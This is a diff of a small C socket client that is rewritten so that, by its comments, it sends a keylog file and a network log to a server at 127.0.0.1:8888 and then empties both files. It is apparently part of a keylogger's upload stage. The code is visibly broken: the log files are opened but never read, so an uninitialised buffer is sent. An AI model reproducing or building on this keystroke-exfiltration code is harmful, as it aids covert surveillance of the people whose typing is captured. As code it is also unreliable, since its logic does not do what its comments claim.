@@ -1,4 +1,4 @@
-nclude <stdio.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>       // strlen
 #include <sys/socket.h>   // socket
@@ -6,15 +6,12 @@ nclude <stdio.h>
 #include <unistd.h>       // write
 #include <fcntl.h>
 
-#include "client.h"
-
-
 int main(int argc , char *argv[])
 {
     // Variables
     int sock, read_size, ret;
     struct sockaddr_in server;
-    char message[2000];
+    char message[3000];
     
     char *addr = "127.0.0.1";
     short port = 8888;
@@ -40,23 +37,27 @@ int main(int argc , char *argv[])
     }
     printf("Connecting to server...\n");
     
-    printf("Enter message: ");
-    scanf("%s" , message);
-    
+    /*Open keylog file for writing*/
+    FILE *keylog_file = fopen("log/keylog.txt", "a");
+    /*Write keylog file*/
     if ((ret = write(sock, message, strlen(message))) <= 0) {
         perror("Error writing\n");
         close(sock);
         exit(0);
     }
-    // Receive a message from server
-    if ((read_size = read(sock, message, sizeof(message))) > 0) {
-        printf("Server: %s\n", message);
-    } else if(read_size == 0) {
-        printf("Server disconnected\n");
-        fflush(stdout);
-    } else if(read_size == -1) {
-        perror("Error receiving message from server\n");
+    /*Clear and close keylog file*/
+    fclose(fopen("log/keylog.txt", "w"));
+    
+    /*Open network_log file for writing*/
+    FILE *network_log = fopen("log/network.txt", "a");
+    /*Write keylog file*/
+    if ((ret = write(sock, message, strlen(message))) <= 0) {
+        perror("Error writing network log\n");
+        close(sock);
+        exit(0);
     }
+    /*Clear and close keylog file*/
+    fclose(fopen("log/network.txt", "w"));
     
     close(sock);
     return 0;
